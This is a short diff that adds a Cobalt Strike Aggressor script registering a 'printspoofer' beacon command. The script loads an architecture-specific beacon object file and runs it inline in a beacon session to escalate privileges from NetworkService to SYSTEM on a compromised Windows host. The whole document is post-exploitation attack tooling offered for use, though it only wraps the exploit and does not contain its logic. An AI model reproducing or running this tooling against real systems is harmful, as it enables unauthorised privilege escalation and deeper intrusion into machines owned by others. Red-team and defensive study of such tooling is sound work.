@@ -1,0 +1,17 @@
+alias printspoofer {
+    $barch  = barch($1);
+    $handle = openf(script_resource("printspoofer. $+ $barch $+ .o"));
+    $object = readb($handle, -1);
+    closef($handle);
+
+    btask($1, "Escalating from NetworkService to SYSTEM.");
+    beacon_inline_execute($1, $object, "go", $null);
+};
+
+beacon_command_register(
+   "printspoofer",
+   "Privesc from NetworkService to SYSTEM",
+   "PrintSpoofer BOF\n\n" .
+   "Usage:\n" .
+   "   printspoofer\n\n"
+);
